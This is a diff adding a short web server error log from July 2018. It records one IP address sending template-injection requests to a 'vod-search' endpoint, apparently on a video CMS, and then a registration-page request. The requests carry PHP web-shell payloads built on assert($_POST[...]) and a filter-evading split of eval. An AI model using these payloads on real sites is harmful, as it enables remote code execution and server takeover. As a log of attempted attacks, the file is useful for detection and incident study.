@@ -1,0 +1,12 @@
+[ 2018-07-02T08:50:28+08:00 ] 132.232.17.124 /index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}
+ERR: 无法加载模块:Vod-search
+
+[ 2018-07-02T08:50:28+08:00 ] 132.232.17.124 /index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}
+ERR: 无法加载模块:Vod-search
+
+[ 2018-07-02T08:50:28+08:00 ] 132.232.17.124 /index.php?m=vod-search&wd={{page:lang}if-A:e{page:lang}val{page:lang}($_PO{page:lang}ST[hxg])}{endif-A}
+ERR: 无法加载模块:Vod-search
+
+[ 2018-07-02T08:50:29+08:00 ] 132.232.17.124 /index.php?m=member&c=index&a=register&siteid=1
+ERR: 无法加载模块:Member
+
